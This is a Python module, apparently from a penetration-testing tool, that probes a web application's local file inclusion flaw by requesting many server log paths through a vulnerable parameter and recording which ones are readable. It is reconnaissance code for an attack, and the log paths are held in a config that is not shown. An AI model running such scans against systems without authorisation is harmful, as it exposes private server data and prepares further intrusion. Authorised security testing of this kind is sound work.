"""
Log scanner module for detecting readable log files via LFI.
Follows Single Responsibility Principle.
"""

import sys
from dataclasses import dataclass
from typing import List, Tuple

from config import Config, LogLocation
from http_client import HttpClient


@dataclass
class VulnerableLog:
    """Represents a readable/vulnerable log file."""
    path: str
    log_type: str
    method: str
    description: str
    content_preview: str


class LogScanner:
    """Scans for readable log files via LFI vulnerability."""
    
    def __init__(self, http_client: HttpClient, target_url: str, param: str, config: Config):
        """
        Initialize log scanner.
        
        Args:
            http_client: HTTP client for making requests
            target_url: Base target URL
            param: LFI parameter name
            config: Application configuration
        """
        self.http_client = http_client
        self.target_url = target_url
        self.param = param
        self.config = config
    
    def test_log_readability(self, log_path: str) -> Tuple[bool, str]:
        """
        Test if a log file is readable via LFI.
        
        Args:
            log_path: Path to the log file to test
            
        Returns:
            Tuple of (is_readable, content)
        """
        test_url = f"{self.target_url}?{self.param}={log_path}"
        
        try:
            response = self.http_client.get(test_url)
            
            if response.status_code == 200:
                for indicator in self.config.log_indicators:
                    if indicator in response.text:
                        return True, response.text
            
            return False, ""
            
        except Exception:
            return False, ""
    
    def scan_all_logs(self) -> List[VulnerableLog]:
        """
        Scan all configured log locations for readable files.
        
        Returns:
            List of vulnerable logs found
        """
        print("\n" + "="*60)
        print("[*] Scanning for readable log files...")
        print("="*60 + "\n")
        
        vulnerable_logs = []
        
        for log_type, log_info in self.config.log_locations.items():
            print(f"[*] Testing {log_info.description}...")
            
            for log_path in log_info.paths:
                sys.stdout.write(f"    Checking: {log_path}... ")
                sys.stdout.flush()
                
                readable, content = self.test_log_readability(log_path)
                
                if readable:
                    print("\033[92m✓ READABLE\033[0m")
                    vulnerable_logs.append(VulnerableLog(
                        path=log_path,
                        log_type=log_type,
                        method=log_info.method,
                        description=log_info.description,
                        content_preview=content[:self.config.max_content_preview]
                    ))
                else:
                    print("\033[91m✗\033[0m")
        
        return vulnerable_logs
